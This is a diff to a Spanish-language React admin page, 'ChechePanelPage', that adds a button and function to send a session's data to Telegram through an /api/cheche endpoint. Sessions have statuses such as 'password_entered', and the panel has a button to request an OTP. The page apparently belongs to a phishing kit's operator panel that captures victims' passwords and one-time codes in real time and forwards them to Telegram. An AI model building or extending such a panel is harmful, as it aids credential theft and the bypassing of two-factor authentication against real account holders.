@@ -96,6 +96,28 @@ export default function ChechePanelPage() {
     }
   };
 
+  const sendToTelegram = async (session: Session) => {
+    try {
+      const response = await fetch('/api/cheche', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'send_to_telegram',
+          sessionId: session.sessionId
+        })
+      });
+
+      if (response.ok) {
+        alert('✅ Datos enviados a Telegram correctamente');
+      } else {
+        alert('❌ Error al enviar a Telegram');
+      }
+    } catch (error) {
+      console.error('Error sending to Telegram:', error);
+      alert('❌ Error al enviar a Telegram');
+    }
+  };
+
   const getStatusBadge = (status: string) => {
     const statusMap: Record<string, { color: string; text: string }> = {
       'processing': { color: 'bg-blue-100 text-blue-800', text: 'Procesando' },
@@ -235,7 +257,18 @@ export default function ChechePanelPage() {
                     </div>
                   </div>
 
-                  <div className="flex gap-3 pt-4 border-t">
+                  <div className="flex gap-3 pt-4 border-t flex-wrap">
+                    {/* Botón para enviar a Telegram - siempre visible */}
+                    <button
+                      onClick={() => sendToTelegram(session)}
+                      className="px-4 py-2 bg-purple-600 text-white rounded-md hover:bg-purple-700 transition flex items-center gap-2"
+                    >
+                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161l-1.84 8.673c-.137.627-.501.782-.956.487l-2.64-1.945-1.273 1.227c-.141.141-.259.259-.532.259l.19-2.688 4.896-4.42c.213-.188-.046-.293-.33-.106l-6.05 3.81-2.608-.816c-.567-.175-.578-.567.119-.839l10.199-3.928c.472-.175.886.112.734.839z"/>
+                      </svg>
+                      Enviar a Telegram
+                    </button>
+
                     {session.status === 'password_entered' && (
                       <button
                         onClick={() => requestOTP(session.sessionId)}
